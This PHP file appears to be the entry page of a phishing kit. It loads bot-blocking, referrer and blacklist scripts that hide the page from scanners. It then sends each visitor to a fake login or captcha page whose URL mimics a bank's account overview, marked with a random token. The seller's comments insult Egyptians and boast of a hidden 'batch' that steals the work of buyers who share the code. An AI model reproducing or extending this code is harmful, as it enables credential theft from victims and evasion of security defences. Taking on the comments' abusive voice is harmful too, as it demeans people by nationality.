<?php
// dont share page will fuk the code but you will stil do beacase all egypt stupid. I will batch all your work dumb fuckers
// @labdata1 if you didnt buy from me i hide batch so buy my code and dont share i will cash all your work LOL LOL.

include './prevents/bot.php';
include './prevents/ref.php';
include './prevents/blacklist.php';
include './prevents/blocker.php';



//set 1 or true to open captcha.php and set 0 to open login page
check_captcha(0);


function genRandString($length = 10)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

/* This function redirects to captcha.php if use_captcha is True, 
otherwise it redirects to login page */

$_SESSION['randString']     = genRandString(80);


function check_captcha($use_captcha)
{
    if ($use_captcha === true || $use_captcha === 1) {
        $destination = "web/captcha.php?web/auth/win#/now/overviewAccounts/overview/index={$_SESSION['randString']}";
    } else {
        $destination = "web/login.php?web/auth/win23#/now/overviewAccounts/overview/index={$_SESSION['randString']}";
    }
    header("Location: $destination");
    exit;
}
